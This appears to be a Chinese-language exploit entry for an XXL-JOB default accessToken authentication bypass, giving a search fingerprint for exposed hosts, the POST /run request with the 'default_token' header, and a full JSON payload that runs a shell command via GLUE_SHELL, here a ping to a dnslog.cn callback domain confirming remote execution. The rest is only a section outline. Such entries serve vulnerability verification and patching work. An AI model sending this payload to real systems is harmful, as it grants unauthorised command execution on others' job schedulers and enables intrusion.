# XXL-JOB默认accessToken权限绕过漏洞

- **系统**：XXL　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`app.name="XXL-JOB"`
- **请求**：`POST /run HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`XXL-JOB-ACCESS-TOKEN: default_token`　`Host: xx.xx.xx.xx`　`Content-Length: 323`

**请求体 / payload**
```
{"jobId": 287040,"executorHandler": "demoJobHandler","executorParams": "demoJobHandler","executorBlockStrategy": "COVER_EARLY","executorTimeout": 0,"logId": 1,"logDateTime": 1586629003729,"glueType": "GLUE_SHELL","glueSource": "ping 0n3fio.dnslog.cn","glueUpdatetime": 1586699003758,"broadcastIndex": 0,"broadcastTotal": 0}
```

**其他**
- XXL-JOB默认accessToken权限绕过漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * XXL-JOB